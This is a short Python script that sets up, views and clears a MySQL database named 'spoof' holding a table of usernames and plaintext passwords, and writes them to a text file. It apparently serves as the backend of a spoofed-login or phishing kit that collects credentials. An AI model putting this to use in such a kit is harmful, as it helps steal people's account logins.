import mysql.connector
import sys

sqlInfo = open('../SqlCredentials.txt','r')
sqlCreds = sqlInfo.readlines()
sqlCreds = [line.replace("\n","") for line in sqlCreds if 1==1]

if sys.argv[1] == "S":
    mydb = ""
    try:
        mydb = mysql.connector.connect(
            host=f"{sqlCreds[0]}",
            user=f"{sqlCreds[1]}",
            password=f"{sqlCreds[2]}",
        )
    except mysql.connector.Error as err:
        print("Mysql Connection error {}".format(err))


    mycursor = mydb.cursor()
    try:
        mycursor.execute("CREATE DATABASE spoof")
        mycursor.close()
        mydb.close()
    except: 
        print("Spoof database already exist")
    
    try: 
        mydb = mysql.connector.connect(
            host=f"{sqlCreds[0]}",
            user=f"{sqlCreds[1]}",
            password=f"{sqlCreds[2]}",
            database=f"{sqlCreds[3]}"
        )
    except mysql.connector.Error as err:
        print("Mysql Connection error {}".format(err))

    mycursor = mydb.cursor()
    try:
        mycursor.execute("CREATE TABLE credentials (id INT AUTO_INCREMENT, username varchar(200), password varchar(200), PRIMARY KEY(id))")
        mycursor.close()
        mydb.close()
    except:
        print("credentials table already exist")

elif sys.argv[1] == "V":
    mydb = ""
    try: 
        mydb = mysql.connector.connect(
            host=f"{sqlCreds[0]}",
            user=f"{sqlCreds[1]}",
            password=f"{sqlCreds[2]}",
            database=f"{sqlCreds[3]}"
        )
    except mysql.connector.Error as err:
        print("Mysql Connection error {}".format(err))

    mycursor = mydb.cursor()
    try:
        mycursor.execute("SELECT * FROM credentials")
        result = mycursor.fetchall()
        credFile = open('Credentials.txt','w')
        credFile.write("ID  |  USER  |  PASS\n____________________\n")
        print("\nID  |  USER  |  PASS")
        print("____________________")
        for x in result:
            print(f"{x[0]}     {x[1]}   {x[2]}")
            credFile.write(f"{x[0]}     {x[1]}   {x[2]}\n")
        print("\n")
        credFile.close()
        mycursor.close()
    except: 
        print("Something went wrong with the credentials table")

elif sys.argv[1] == "R":
    mydb = ""
    try: 
        mydb = mysql.connector.connect(
            host=f"{sqlCreds[0]}",
            user=f"{sqlCreds[1]}",
            password=f"{sqlCreds[2]}",
            database=f"{sqlCreds[3]}"
        )
    except mysql.connector.Error as err:
        print("Mysql Connection error {}".format(err))

    mycursor = mydb.cursor()
    try:
        mycursor.execute("DELETE FROM credentials")
        mycursor.close()
    except:
        print("Something went wrong when deleting the table")

